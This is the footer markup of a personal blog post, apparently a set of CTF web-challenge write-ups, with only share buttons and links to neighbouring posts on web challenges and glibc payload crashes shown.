</div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2021-04-17</span><i class="fa fa-tag"></i><a class="tag" href="/tags/WEB/" title="WEB">WEB </a><span class="leancloud_visitors"></span></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="" onclick="javascript:join_favorite()" ref="sidebar"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" target="_blank" rel="noopener" href="http://twitter.com/home?status=,http://example.com/2021/04/17/BUU-WEB-0x1-0xF/,郁涛丶's Blog,BUU_WEB刷题_0x01-0x0F,;"></a></div></div><div class="pagination"><ul class="clearfix"><li class="pre pagbuttons"><a class="btn" role="navigation" href="/2021/05/03/BUU_WEB_0x10-0x1F/" title="BUU_WEB刷题_0x10-0x1F">上一篇</a></li><li class="next pagbuttons"><a class="btn" role="navigation" href="/2021/04/08/64%E4%B8%BApayload%E8%B0%83%E7%94%A8system%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98/" title="在64位的glibc上payload调用system导致crash的问题">下一篇</a></li></ul></div><script src="/js/visitors.js"></script></div></div></div></div><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script><script src="/js/add-bookmark.js"></script></body></html>